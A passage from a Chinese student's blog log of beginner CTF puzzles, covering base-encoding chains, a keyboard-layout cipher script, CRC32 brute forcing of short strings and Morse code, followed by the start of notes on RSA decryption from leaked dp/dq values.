id="题目-11"><a href="#题目-11" class="headerlink" title="题目"></a>题目</h3><blockquote><p>打开后真的好长的HEX，杂了base64、base32</p></blockquote><h3 id="题解-9"><a href="#题解-9" class="headerlink" title="题解"></a>题解</h3><blockquote><p>厨子👨‍🍳一把梭，啥都不说了，开烹！</p></blockquote><p>点了大概十几下数据美化</p><p><img src="https://s2.loli.net/2022/01/04/gN9YvAxizhHsDMy.png" alt="image-20220104170159491"></p><p><strong>CyberChef，YYDS！</strong>（稳定性与可处理的数据量都好完美</p><p><img src="https://s2.loli.net/2022/01/04/k1A2Bh7nZ5H4fem.png" alt="image-20220104170257581"></p><h2 id="看的出来吗-·-82"><a href="#看的出来吗-·-82" class="headerlink" title="看的出来吗 · 82"></a>看的出来吗 · 82</h2><h3 id="题目-12"><a href="#题目-12" class="headerlink" title="题目"></a>题目</h3><blockquote><p>有一串神奇的字符串bE0veldtTDs7NzlTe3hzbSFYSj5Sa2U6eyQ4NyVrI3FvWFU6Qls7QlVK，还有一张纸条写着589164</p></blockquote><p>看了后，完全没思绪。</p><p>长这个样子，又有key的加密方式确实是不知道…</p><h3 id="题解-10"><a href="#题解-10" class="headerlink" title="题解"></a>题解</h3><p>经过base64解码、base91解码、base58解码得到</p><p><code>https://base64.supfree.net/</code><br><code>http://ctf.ssleye.com/base91.html</code><br><code>http://ctf.ssleye.com/base58w.html</code><br><img src="https://img-blog.csdnimg.cn/235d4d2cc98e47f8849339871508f4bd.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg1OTg1MA==,size_16,color_FFFFFF,t_70" alt="flag"></p><p><strong>恐怖如斯</strong>，原来是base的58、91、64（说来好像遇到过，看来印象不够深刻</p><h2 id="键盘之争-·-84"><a href="#键盘之争-·-84" class="headerlink" title="键盘之争 · 84"></a>键盘之争 · 84</h2><h3 id="题目-13"><a href="#题目-13" class="headerlink" title="题目"></a>题目</h3><blockquote><p>你听说过键盘之争吗？提交你找到的字符串md5值。</p><p>ypau_kjg;”g;”ypau+</p></blockquote><p>好的，👀看了半天，啥也没看出来</p><h3 id="题解-11"><a href="#题解-11" class="headerlink" title="题解"></a>题解</h3><blockquote><p>键盘布局有qwerty、dvorak、colemak<br>此题考察的是将qwerty布局转为dvorak</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/9f5f381cfd61460c7f43f2e945e6ad89.png" alt="img"></p><h4 id="代码实现-2"><a href="#代码实现-2" class="headerlink" title="代码实现"></a>代码实现</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">dic=&#123;<span class="string">r&quot;&#x27;&quot;</span>:<span class="string">&quot;q&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;,&quot;</span>:<span class="string">&quot;w&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;.&quot;</span>:<span class="string">&quot;e&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;p&quot;</span>:<span class="string">&quot;4&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;y&quot;</span>:<span class="string">&quot;t&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;f&quot;</span>:<span class="string">&quot;y&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;g&quot;</span>:<span class="string">&quot;u&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;c&quot;</span>:<span class="string">&quot;i&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;r&quot;</span>:<span class="string">&quot;o&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;l&quot;</span>:<span class="string">&quot;p&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;/&quot;</span>:<span class="string">r&quot;[&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;=&quot;</span>:<span class="string">r&quot;]&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&#x27;&quot;&#x27;</span>:<span class="string">&#x27;Q&#x27;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;&lt;&quot;</span>:<span class="string">&quot;W&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;&gt;&quot;</span>:<span class="string">&quot;E&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;P&quot;</span>:<span class="string">&quot;R&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;Y&quot;</span>:<span class="string">&quot;T&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;F&quot;</span>:<span class="string">&quot;Y&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;G&quot;</span>:<span class="string">&quot;U&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;C&quot;</span>:<span class="string">&quot;I&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;R&quot;</span>:<span class="string">&quot;O&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;L&quot;</span>:<span class="string">&quot;P&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;?&quot;</span>:<span class="string">r&quot;&#123;&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;+&quot;</span>:<span class="string">r&quot;&#125;&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;a&quot;</span>:<span class="string">&quot;a&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;A&quot;</span>:<span class="string">&quot;A&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;o&quot;</span>:<span class="string">&quot;s&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;O&quot;</span>:<span class="string">&quot;S&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;e&quot;</span>:<span class="string">&quot;d&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;E&quot;</span>:<span class="string">&quot;D&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;u&quot;</span>:<span class="string">&quot;f&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;U&quot;</span>:<span class="string">&quot;F&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;i&quot;</span>:<span class="string">&quot;g&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;I&quot;</span>:<span class="string">&quot;G&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;d&quot;</span>:<span class="string">&quot;h&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;D&quot;</span>:<span class="string">&quot;H&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;h&quot;</span>:<span class="string">&quot;j&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;H&quot;</span>:<span class="string">&quot;J&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;t&quot;</span>:<span class="string">&quot;k&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;T&quot;</span>:<span class="string">&quot;K&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;n&quot;</span>:<span class="string">&quot;l&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;N&quot;</span>:<span class="string">&quot;L&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;s&quot;</span>:<span class="string">&quot;;&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;S&quot;</span>:<span class="string">&quot;:&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;-&quot;</span>:<span class="string">r&quot;&#x27;&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&#x27;_&#x27;</span>:<span class="string">r&#x27;&quot;&#x27;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;;&quot;</span>:<span class="string">&quot;z&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;:&quot;</span>:<span class="string">&quot;Z&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;q&quot;</span>:<span class="string">&quot;x&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;Q&quot;</span>:<span class="string">&quot;X&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;j&quot;</span>:<span class="string">&quot;c&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;J&quot;</span>:<span class="string">&quot;C&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;k&quot;</span>:<span class="string">&quot;v&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;K&quot;</span>:<span class="string">&quot;V&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;x&quot;</span>:<span class="string">&quot;b&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;X&quot;</span>:<span class="string">&quot;B&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;b&quot;</span>:<span class="string">&quot;n&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;B&quot;</span>:<span class="string">&quot;N&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;m&quot;</span>:<span class="string">&quot;m&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;M&quot;</span>:<span class="string">&quot;M&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;w&quot;</span>:<span class="string">r&quot;,&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;W&quot;</span>:<span class="string">r&quot;&lt;&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;v&quot;</span>:<span class="string">r&quot;.&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;V&quot;</span>:<span class="string">r&quot;&gt;&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;z&quot;</span>:<span class="string">r&quot;/&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;Z&quot;</span>:<span class="string">r&quot;?&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&#x27;!&#x27;</span>:<span class="string">&quot;!&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;@&quot;</span>:<span class="string">r&quot;@&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;#&quot;</span>:<span class="string">r&quot;#&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;$&quot;</span>:<span class="string">r&quot;$&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;%&quot;</span>:<span class="string">r&quot;%&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;^&quot;</span>:<span class="string">r&quot;^&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;&amp;&quot;</span>:<span class="string">r&quot;&amp;&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;*&quot;</span>:<span class="string">r&quot;*&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;(&quot;</span>:<span class="string">r&quot;(&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;)&quot;</span>:<span class="string">r&quot;)&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;[&quot;</span>:<span class="string">r&quot;-&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;]&quot;</span>:<span class="string">r&quot;=&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;&#123;&quot;</span>:<span class="string">r&quot;_&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;&#125;&quot;</span>:<span class="string">r&quot;+&quot;</span>&#125;</span><br><span class="line"> </span><br><span class="line">s=<span class="string">r&#x27;ypau_kjg;&quot;g;&quot;ypau+&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot; &quot;</span>.join([key <span class="keyword">for</span> key, value <span class="keyword">in</span> dic.items() <span class="keyword">if</span> value == i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">m = hashlib.md5()</span><br><span class="line"></span><br><span class="line">m.update(*b*<span class="string">&#x27;this_is_flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span> + m.hexdigest() + <span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="easy-CRC-·-92"><a href="#easy-CRC-·-92" class="headerlink" title="easy_CRC · 92"></a>easy_CRC · 92</h2><h3 id="题目-14"><a href="#题目-14" class="headerlink" title="题目"></a>题目</h3><blockquote><p>1:C4E68E3A<br>2:08FF301C<br>3:F6FBA587<br>4:B85C2F9A<br>5:F1B73D20<br>6:C6F1D9D7</p><p>flag=1+2+3+4+5+6<br>Each serial number consists of 4 characters</p></blockquote><h3 id="题解-12"><a href="#题解-12" class="headerlink" title="题解"></a>题解</h3><p>已知明文长度的CRC爆破，具体学习可见：<a href="https://blog.csdn.net/mochu7777777/article/details/110206427">Python·CRC爆破学习</a></p><h4 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 四字节爆破</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_crc</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-------------Start Crack CRC-------------&#x27;</span>)</span><br><span class="line">    crc_list = [<span class="number">0xC4E68E3A</span>, <span class="number">0x08FF301C</span>, <span class="number">0xF6FBA587</span>, <span class="number">0xB85C2F9A</span>, <span class="number">0xF1B73D20</span>, <span class="number">0xC6F1D9D7</span>]  <span class="comment"># 文件的CRC32值列表，注意顺序</span></span><br><span class="line">    comment = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    chars = string.printable</span><br><span class="line">    <span class="keyword">for</span> crc_value <span class="keyword">in</span> crc_list:</span><br><span class="line">        <span class="keyword">for</span> char1 <span class="keyword">in</span> chars:</span><br><span class="line">            <span class="keyword">for</span> char2 <span class="keyword">in</span> chars:</span><br><span class="line">                <span class="keyword">for</span> char3 <span class="keyword">in</span> chars:</span><br><span class="line">                    <span class="keyword">for</span> char4 <span class="keyword">in</span> chars:</span><br><span class="line">                        res_char = char1 + char2 + char3 + char4<span class="comment">#获取遍历的任意4Byte字符</span></span><br><span class="line">                        char_crc = binascii.crc32(res_char.encode())<span class="comment">#获取遍历字符的CRC32值</span></span><br><span class="line">                        calc_crc = char_crc &amp; <span class="number">0xffffffff</span><span class="comment">#将遍历的字符的CRC32值与0xffffffff进行与运算</span></span><br><span class="line">                        <span class="keyword">if</span> calc_crc == crc_value:<span class="comment">#将获取字符的CRC32值与每个文件的CRC32值进行匹配</span></span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&#x27;[+] &#123;&#125;: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(crc_value),res_char))</span><br><span class="line">                            comment += res_char</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-----------CRC Crack Completed-----------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Result: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(comment))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    crack_crc()</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    -------------Start Crack CRC-------------</span></span><br><span class="line"><span class="string">[+] 0xc4e68e3a: b323</span></span><br><span class="line"><span class="string">[+] 0x8ff301c: 1e94</span></span><br><span class="line"><span class="string">[+] 0xf6fba587: f045</span></span><br><span class="line"><span class="string">[+] 0xb85c2f9a: e76e</span></span><br><span class="line"><span class="string">[+] 0xf1b73d20: 5932</span></span><br><span class="line"><span class="string">[+] 0xc6f1d9d7: 66f4</span></span><br><span class="line"><span class="string">-----------CRC Crack Completed-----------</span></span><br><span class="line"><span class="string">Result: b3231e94f045e76e593266f4</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="Crypto-xor-·-95"><a href="#Crypto-xor-·-95" class="headerlink" title="Crypto_xor · 95"></a>Crypto_xor · 95</h2><h2 id="2018-AFCTF-MagicNum-·-86"><a href="#2018-AFCTF-MagicNum-·-86" class="headerlink" title="2018 AFCTF MagicNum · 86"></a>2018 AFCTF MagicNum · 86</h2><h3 id="题目-15"><a href="#题目-15" class="headerlink" title="题目"></a>题目</h3><blockquote><p>72065910510177138000000000000000.000000<br>71863209670811371000000.000000<br>18489682625412760000000000000000.000000<br>72723257588050687000000.000000<br>4674659167469766200000000.000000<br>19061698837499292000000000000000000000.000000</p></blockquote><p>看不明白！</p><h3 id="题解-13"><a href="#题解-13" class="headerlink" title="题解"></a>题解</h3><p>流加密，待续</p><h2 id="1837-·-86"><a href="#1837-·-86" class="headerlink" title="1837 · 86"></a>1837 · 86</h2><h3 id="题目-16"><a href="#题目-16" class="headerlink" title="题目"></a>题目</h3><blockquote><p>MTEgMTExIDAwMCAwMCAwMTExMSAwMDAgMDAxMCAwMDEgMTA</p></blockquote><h3 id="题解-14"><a href="#题解-14" class="headerlink" title="题解"></a>题解</h3><ol><li><p>base64解码</p><blockquote><p>11 111 000 00 01111 000 0010 001 10</p></blockquote><p>这里觉得好熟悉，卡了一会儿，在想<strong>1837</strong></p></li><li><p>摩斯电码解码</p><blockquote><p>flag{MOSI1SFUN}</p></blockquote></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>01码与摩斯电码的配合</li><li><strong>1837年</strong>摩斯电码诞生</li></ul><h2 id="目前"><a href="#目前" class="headerlink" title="目前"></a>目前</h2><blockquote><p>主要在看RSA与BMZCTF刷题。</p></blockquote><h3 id="排名：-52-1605"><a href="#排名：-52-1605" class="headerlink" title="排名： 52 / 1605"></a>排名： 52 / 1605</h3><p><img src="https://s2.loli.net/2022/01/04/IUqDK5hTwtylEdQ.png" alt="image-20220104212945165"></p><h3 id="答题情况"><a href="#答题情况" class="headerlink" title="答题情况"></a>答题情况</h3><p>🧻❤️㊙️🐎</p><p><img src="https://s2.loli.net/2022/01/04/F7vrmqTcXSGgdyf.png" alt="image-20220104213159832"></p><p><img src="https://s2.loli.net/2022/01/04/uYNLzcOwFl6C2US.png" alt="image-20220104213242151"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假修炼记（二）</title>
      <link href="/2021/12/30/%E5%AF%92%E5%81%87%E4%BF%AE%E7%82%BC%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2021/12/30/%E5%AF%92%E5%81%87%E4%BF%AE%E7%82%BC%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-5"><a href="#1-5" class="headerlink" title="1.5"></a>1.5</h1><p><a href="https://www.bilibili.com/video/BV1Dw411f7Ht?p=12&spm_id_from=333.788.b_6d756c74695f70616765.12">课程</a></p><h2 id="RSA·dp、dq泄漏"><a href="#RSA·dp、dq泄漏" class="headerlink" title="RSA·dp、dq泄漏"></a>RSA·dp、dq泄漏</h2><h3 id="什么是dp、dq"><a href="#什么是dp、dq" class="headerlink" title="什么是dp、dq"></a>什么是dp、dq</h3><blockquote><p>dp = d mod (p-1)<br>dq = d mod (q-1)</p></blockquote><h3 id="重要结论"><a href="#重要结论" class="headerlink" title="重要结论"></a>重要结论</h3><h4 id="当m-lt-p-或-q时"><a href="#当m-lt-p-或-q时" class="headerlink" title="当m &lt; p 或 q时"></a>当m &lt; p 或 q时</h4><p>m&lt;p:</p><p>$$ m = c^d \mod p$$   </p><p>$$ m = c ^ {dp} \mod p $$</p><p>m&lt;q:</p><p>$$ m = c^d \mod q$$   </p><p>$$ m = c ^ {dp} \mod p $$</p><h3 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h3><p><img src="https://s2.loli.net/2022/01/05/OYNIbvuctwnxG75.png" alt="image-20220105105634124"></p><h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m = <span class="built_in">pow</span>(c, dp, p)</span><br></pre></td></tr></table></figure><h4 id="更一般的"><a href="#更一般的" class="headerlink" title="更一般的"></a>更一般的</h4><blockquote><p>已知条件<br>c = m^e mod n<br>m = c^d mod n<br>ϕ(n)= (p−1)<em>(q−1)<br>d</em>e≡ 1 mod ϕ(n)<br>dp= d mod (p−1)<br>dq= d mod (q−1)</p><p>m=c^d mod n<br>m=c^d+k*n</p><p>因为 n=p<em>q<br>m=c^d+p</em>q*k</p><p>同时取余q和p</p><p>式1 m1=c^d mod q<br>式1 c^d=kp+m1</p><p>式2 m2=c^d mod p</p><p>式1带入式2<br>m2=(kp+m1) mod q</p><p>等式两边同时减去m1<br>(m2−m1)≡kp mod q</p><p>因为gcd(p,q)=1<br>所以可以求p的逆元，得到<br>(m2−m1)*p−1≡k mod q</p><p>得到如下两个式子<br>k≡(m2−m1)*p−1 mod q</p><p>c^d=kp+m1<br>m≡c^d mod n</p><p>上下两个式子合并</p><p>c^d = ((m2−m1)*p−1 mod q)p+m1<br>m ≡ c^d mod n</p><p>最后可以有</p><p>m≡(((m2−m1)*p−1 mod q)p+m1) mod n</p><p>只剩最后一步了</p><p>m1≡cd mod q<br>m2≡cd mod p</p><p>m1和m2怎么求</p><p>d≡dp mod (p−1)<br>d≡dq mod (q−1)</p><p>那么分别带入</p><p>m1≡cdq mod (q−1) mod q<br>m2≡cdp mod (p−1) mod p</p><p>费马小定理即假如p是质数，且gcd(a,p)=1<br>a^(p−1)≡1 mod p</p><p>所以如果我们有等式</p><p>d=dp+k*(p−1)</p><p>直接带入<br>m2≡c^dp+k*(p−1) mod p</p><p>这里的指数，我们拆开，为<br>m2≡c^dp<em>ck</em>(p−1) mod p</p><p>ck*(p−1)≡1 mod p</p><p>因为p是大素数，显然和c互素所以可以直接得到<br>m2≡cd^p mod p</p><p>那么m1根据对称性也可以同理得到</p><p>m1≡cd^q mod q</p><p>故此，我们现在拥有了所有条件，下面归纳一下为</p><p>m1≡cd^q mod q<br>m2≡cd^p mod p<br>m≡(((m2−m1)*p−1 mod q)p+m1) mod n </p></blockquote><h5 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">dp,dq,p,q,c</span>):</span></span><br><span class="line">    InvQ = gmpy2.invert(q, p)</span><br><span class="line">    mp = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">    mq = <span class="built_in">pow</span>(c, dq, q)</span><br><span class="line">    m = (((mp-mq)*InvQ) % p)*q+mq</span><br><span class="line">    <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)).decode())</span><br><span class="line"></span><br><span class="line">p= <span class="number">160332148422085773419118366054725936852233416334843123745197905865814122767542980683547268180832158164485150298039693727719040683372172258525148659296087240380682418673910965969383538696724039000114078510939033236731476700182949760779821042982194738324421029616780752077145649691266297077244661585947836997447</span></span><br><span class="line">q= <span 